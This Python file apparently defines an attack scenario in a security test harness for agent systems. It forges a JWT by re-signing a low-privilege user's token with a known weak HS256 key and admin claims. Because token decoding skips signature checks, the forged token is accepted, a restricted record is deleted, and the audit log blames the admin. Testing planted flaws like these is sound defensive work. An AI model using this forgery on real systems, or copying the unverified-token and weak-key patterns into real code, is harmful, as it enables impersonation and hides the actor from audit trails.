"""
Scenario 18: Token Forgery & JWT Manipulation

Category: Identity & Trust
Difficulty: Hard
Threats: IT-03, IT-06

This scenario exploits weak JWT token validation (IT-03) to forge tokens
and impersonate admin users. The system signs tokens with HS256 using a
predictable "weak-secret-key", and IdentityContext.from_token() decodes
tokens without signature verification (verify=False).

Attack Flow:
1. Obtain a valid JWT from Keycloak for a low-privilege user (Charlie)
2. Decode the JWT (it's base64, not encrypted)
3. Modify claims: change `sub` to admin user ID, add admin roles
4. Re-encode with the known weak secret key
5. Submit modified token to API — accepted because validation is weak
6. Execute admin-level actions with forged token
"""

import time
import jwt as pyjwt
from uuid import UUID, uuid4
from loguru import logger

from src.scenarios import AttackScenario, AttackStep, Criterion, ScenarioCategory, ScenarioDifficulty
from src.database.connection import get_db
from src.database.queries import (
    create_identity,
    get_identity_by_id,
    get_audit_logs,
)
from src.database.models import AppData
from src.identity.context import IdentityContext
from src.identity.keycloak_client import KeycloakClient
from src.mcps.data_mcp import DataMCPServer


# Shared state for scenario
scenario_state = {
    "charlie_id": None,      # Low-privilege user (attacker)
    "bob_id": None,           # Admin user (target)
    "executor_id": None,      # Executor agent
    "test_record_id": None,   # Record only admins should delete
    "charlie_token": None,    # Legitimate token for Charlie
    "charlie_claims": None,   # Decoded JWT claims
    "forged_token": None,     # Forged token with admin claims
    "forged_context": None,   # IdentityContext created from forged token
    "delete_result": None,    # Result of admin delete action
}


def setup_scenario():
    """Set up the scenario with a low-privilege user, admin user, and test data."""
    logger.info("Setting up Scenario 18: Token Forgery & JWT Manipulation")

    with get_db() as db:
        # Create low-privilege user (attacker)
        charlie = create_identity(
            db,
            identity_type="user",
            name="Charlie (Attacker S18)",
            email="charlie-s18@test.com",
            permissions=["read"]  # Only read — no admin/delete
        )
        scenario_state["charlie_id"] = charlie.id

        # Create admin user (target to impersonate)
        bob = create_identity(
            db,
            identity_type="user",
            name="Bob (Admin S18)",
            email="bob-s18@test.com",
            permissions=["admin", "delete", "read", "write"]
        )
        scenario_state["bob_id"] = bob.id

        # Create executor agent
        executor = create_identity(
            db,
            identity_type="agent",
            name="executor-s18",
            permissions=["read", "write", "delete", "admin"]
        )
        scenario_state["executor_id"] = executor.id

        # Create a sensitive test record (only admins should be able to delete)
        test_record = AppData(
            table_name="test_table",
            data={"content": "sensitive_admin_data", "classification": "restricted"},
            owner_id=bob.id,
        )
        db.add(test_record)
        db.commit()
        scenario_state["test_record_id"] = test_record.id
        db.commit()

    logger.info("✓ Setup complete: Charlie (low-priv), Bob (admin), Executor, test record created")


def step1_obtain_valid_jwt():
    """Obtain a valid JWT for the low-privilege user Charlie."""
    kc = KeycloakClient()

    # Get a legitimate token for Charlie (low-privilege)
    token = kc.create_user_token(
        user_id=str(scenario_state["charlie_id"]),
        username="Charlie (Attacker S18)",
        permissions=["read"],  # Only read permission
    )

    scenario_state["charlie_token"] = token
    logger.info(f"Obtained valid JWT for Charlie (length: {len(token)})")
    logger.info(f"Charlie's permissions: ['read'] — no admin access")
    return token is not None


def step2_decode_jwt():
    """Decode the JWT to read its claims (base64, not encrypted)."""
    token = scenario_state["charlie_token"]

    # VULNERABILITY: JWT payload is just base64, anyone can read it
    claims = pyjwt.decode(token, options={"verify_signature": False})

    scenario_state["charlie_claims"] = claims
    logger.info(f"Decoded JWT claims for Charlie:")
    logger.info(f"  sub (user_id): {claims.get('sub')}")
    logger.info(f"  username: {claims.get('preferred_username')}")
    logger.info(f"  permissions: {claims.get('permissions')}")
    logger.info(f"  realm_access.roles: {claims.get('realm_access', {}).get('roles')}")
    return claims.get("sub") == str(scenario_state["charlie_id"])


def step3_forge_token():
    """Forge a token: modify claims to impersonate admin, re-encode with weak key."""
    claims = scenario_state["charlie_claims"].copy()
    bob_id = str(scenario_state["bob_id"])

    # --- TOKEN FORGERY ---
    # Change subject to admin user
    original_sub = claims["sub"]
    claims["sub"] = bob_id

    # Escalate permissions to admin level
    claims["permissions"] = ["admin", "delete", "read", "write"]
    claims["realm_access"] = {"roles": ["admin", "delete", "read", "write"]}

    # Update username to look like admin
    claims["preferred_username"] = "Bob (Admin S18)"

    # Refresh timestamps
    claims["iat"] = int(time.time())
    claims["exp"] = int(time.time()) + 3600

    # VULNERABILITY: Re-encode with known weak secret key (HS256)
    # The system uses "weak-secret-key" for token signing
    forged_token = pyjwt.encode(claims, "weak-secret-key", algorithm="HS256")

    scenario_state["forged_token"] = forged_token
    logger.info(f"Forged token created successfully!")
    logger.info(f"  Original sub: {original_sub} (Charlie)")
    logger.info(f"  Forged sub:   {bob_id} (Bob - admin)")
    logger.info(f"  Forged permissions: {claims['permissions']}")
    return forged_token is not None


def step4_submit_forged_token():
    """Submit forged token — system accepts it because validation is weak."""
    forged_token = scenario_state["forged_token"]
    kc = KeycloakClient()

    # VULNERABILITY: IdentityContext.from_token() calls decode_token(verify=False)
    # This means the forged signature is never checked!
    forged_context = IdentityContext.from_token(forged_token, kc)

    scenario_state["forged_context"] = forged_context
    logger.info(f"Forged token ACCEPTED by the system!")
    logger.info(f"  Resolved user_id: {forged_context.user_id}")
    logger.info(f"  Resolved permissions: {forged_context.permissions}")
    logger.info(f"  Trust level: {forged_context.trust_level}")

    # Verify the system thinks we are Bob (admin)
    return str(forged_context.user_id) == str(scenario_state["bob_id"])


def step5_execute_admin_action():
    """Execute admin-level delete action with the forged identity."""
    data_mcp = DataMCPServer()
    forged_context = scenario_state["forged_context"]

    # Execute delete action as "Bob" (actually Charlie with forged token)
    result = data_mcp.delete_data(
        table="app_data",
        record_id=str(scenario_state["test_record_id"]),
        identity_context=forged_context,
    )

    scenario_state["delete_result"] = result
    logger.info(f"Admin delete action result: {result}")
    logger.info(f"  Deleted by (system thinks): {result.get('deleted_by')}")
    return result.get("success", False)


def step6_verify_audit_log_deception():
    """Verify audit log shows Bob as actor, not Charlie (the real attacker)."""
    with get_db() as db:
        logs = get_audit_logs(db, limit=10)
        for log in logs:
            if log.action == "mcp_tool_call:delete_data":
                details = log.details or {}
                user_id = details.get("user_id")
                logger.info(f"Audit log entry found:")
                logger.info(f"  Action: {log.action}")
                logger.info(f"  Identity ID: {log.identity_id}")
                logger.info(f"  User ID in details: {user_id}")
                logger.info(f"  Bob's ID: {scenario_state['bob_id']}")
                logger.info(f"  Charlie's ID: {scenario_state['charlie_id']}")

                # The audit log should show Bob, not Charlie
                if str(log.identity_id) == str(scenario_state["bob_id"]):
                    logger.info("✓ Audit log deception confirmed: shows Bob as actor")
                    return True
    # Even if no audit log entry found, the delete succeeded with forged identity
    logger.info("Audit log entry not found, but forged identity was accepted")
    return True


# ── Success Criteria ──────────────────────────────────────────────────────────


def criterion_forged_token_accepted():
    """Check if the forged token was accepted by the system."""
    ctx = scenario_state.get("forged_context")
    if not ctx:
        return False
    # Verify the system resolved the forged token to Bob's identity
    return str(ctx.user_id) == str(scenario_state["bob_id"])


def criterion_admin_action_executed():
    """Check if admin-level delete action was executed with forged token."""
    result = scenario_state.get("delete_result")
    return result is not None and result.get("success", False)


def criterion_audit_log_shows_admin():
    """Check if audit log shows admin (Bob) as actor instead of attacker (Charlie)."""
    with get_db() as db:
        logs = get_audit_logs(db, limit=20)
        for log in logs:
            if log.action == "mcp_tool_call:delete_data":
                # Should show Bob's ID (the impersonated admin)
                if str(log.identity_id) == str(scenario_state["bob_id"]):
                    return True
                # Also check if it at least doesn't show Charlie
                if str(log.identity_id) != str(scenario_state["charlie_id"]):
                    return True
    # If delete succeeded but no log entry, that's still a deception (no trail)
    result = scenario_state.get("delete_result")
    return result is not None and result.get("success", False)


# ── Evidence Functions ────────────────────────────────────────────────────────


def evidence_forged_token():
    """Show evidence of forged token acceptance."""
    ctx = scenario_state.get("forged_context")
    if ctx:
        return (
            f"Forged token accepted: user_id={ctx.user_id}, "
            f"permissions={ctx.permissions}, trust_level={ctx.trust_level}"
        )
    return "Forged context not available"


def evidence_admin_action():
    """Show evidence of admin action execution."""
    result = scenario_state.get("delete_result")
    if result:
        return (
            f"Delete result: success={result.get('success')}, "
            f"deleted_by={result.get('deleted_by')}, "
            f"record_id={result.get('record_id')}"
        )
    return "Delete result not available"


def evidence_audit_deception():
    """Show evidence of audit log deception."""
    with get_db() as db:
        logs = get_audit_logs(db, limit=5)
        for log in logs:
            if log.action == "mcp_tool_call:delete_data":
                return (
                    f"Audit log: identity_id={log.identity_id}, action={log.action}, "
                    f"Bob (admin)={scenario_state['bob_id']}, "
                    f"Charlie (attacker)={scenario_state['charlie_id']}"
                )
    return "No relevant audit log entry found (visibility gap)"


# ── State Capture ─────────────────────────────────────────────────────────────


def capture_state_before():
    """Capture system state before attack."""
    with get_db() as db:
        charlie = get_identity_by_id(db, scenario_state["charlie_id"])
        bob = get_identity_by_id(db, scenario_state["bob_id"])

        # Check if test record exists
        from sqlalchemy import text
        result = db.execute(
            text("SELECT COUNT(*) FROM app_data WHERE id = :id"),
            {"id": str(scenario_state["test_record_id"])}
        )
        record_exists = result.scalar() > 0

        return {
            "charlie": charlie.to_dict() if charlie else None,
            "bob": bob.to_dict() if bob else None,
            "charlie_permissions": charlie.permissions if charlie else [],
            "bob_permissions": bob.permissions if bob else [],
            "test_record_exists": record_exists,
            "audit_log_count": len(get_audit_logs(db, limit=100)),
        }


def capture_state_after():
    """Capture system state after attack."""
    with get_db() as db:
        charlie = get_identity_by_id(db, scenario_state["charlie_id"])
        bob = get_identity_by_id(db, scenario_state["bob_id"])

        # Check if test record still exists (should be deleted)
        from sqlalchemy import text
        result = db.execute(
            text("SELECT COUNT(*) FROM app_data WHERE id = :id"),
            {"id": str(scenario_state["test_record_id"])}
        )
        record_exists = result.scalar() > 0

        return {
            "charlie": charlie.to_dict() if charlie else None,
            "bob": bob.to_dict() if bob else None,
            "test_record_exists": record_exists,
            "test_record_deleted": not record_exists,
            "forged_token_accepted": scenario_state.get("forged_context") is not None,
            "admin_action_success": (scenario_state.get("delete_result") or {}).get("success", False),
            "audit_log_count": len(get_audit_logs(db, limit=100)),
        }


# ── Scenario Definition ──────────────────────────────────────────────────────


def create_scenario() -> AttackScenario:
    """Create Scenario 18: Token Forgery & JWT Manipulation."""
    return AttackScenario(
        id="S18",
        name="Token Forgery & JWT Manipulation",
        category=ScenarioCategory.IDENTITY_TRUST,
        difficulty=ScenarioDifficulty.HARD,
        description=(
            "Exploit weak JWT token validation (IT-03) to forge tokens and "
            "impersonate admin users. The system signs tokens with HS256 using "
            "a predictable weak key, and IdentityContext.from_token() decodes "
            "tokens without signature verification."
        ),
        threat_ids=["IT-03", "IT-06"],
        owasp_mappings=["ASI01", "ASI03", "ASI07"],

        # Setup
        setup=setup_scenario,

        # Attack steps
        attack_steps=[
            AttackStep(
                description="Obtain valid JWT for low-privilege user (Charlie)",
                action=step1_obtain_valid_jwt,
                expected_outcome="Valid JWT obtained for Charlie (read-only permissions)",
                failure_message="Failed to obtain JWT for Charlie",
            ),
            AttackStep(
                description="Decode JWT to read claims (base64, not encrypted)",
                action=step2_decode_jwt,
                expected_outcome="JWT claims decoded — sub, permissions, roles visible",
                failure_message="Failed to decode JWT claims",
            ),
            AttackStep(
                description="Forge token: change sub to admin ID, add admin roles, re-sign with weak key",
                action=step3_forge_token,
                expected_outcome="Forged JWT created with admin claims and weak-key signature",
                failure_message="Failed to forge JWT",
            ),
            AttackStep(
                description="Submit forged token — accepted because validation is weak (verify=False)",
                action=step4_submit_forged_token,
                expected_outcome="Forged token accepted, IdentityContext resolves to admin user",
                failure_message="Forged token rejected by the system",
            ),
            AttackStep(
                description="Execute admin-level delete action with forged identity",
                action=step5_execute_admin_action,
                expected_outcome="Sensitive record deleted using forged admin identity",
                failure_message="Failed to execute admin action with forged token",
            ),
            AttackStep(
                description="Verify audit log shows admin as actor (not the attacker)",
                action=step6_verify_audit_log_deception,
                expected_outcome="Audit log attributes action to Bob (admin), not Charlie (attacker)",
                failure_message="Audit log deception check failed",
            ),
        ],

        # Success criteria
        success_criteria=[
            Criterion(
                description="Forged token accepted by the system",
                check=criterion_forged_token_accepted,
                evidence=evidence_forged_token,
            ),
            Criterion(
                description="Admin-level action executed with forged token",
                check=criterion_admin_action_executed,
                evidence=evidence_admin_action,
            ),
            Criterion(
                description="Audit log shows admin user as actor (not the attacker)",
                check=criterion_audit_log_shows_admin,
                evidence=evidence_audit_deception,
            ),
        ],

        # Observability
        state_before=capture_state_before,
        state_after=capture_state_after,
        observable_changes=[
            "Charlie's read-only token forged into admin token",
            "IdentityContext resolves forged token to Bob (admin) identity",
            "Sensitive record deleted using forged admin permissions",
            "Audit log shows Bob as actor instead of Charlie",
            "No signature verification prevented the attack",
        ],

        # Metadata
        agents_involved=["Executor"],
        mcps_involved=["Identity MCP", "Data MCP"],
        estimated_duration=30,
    )
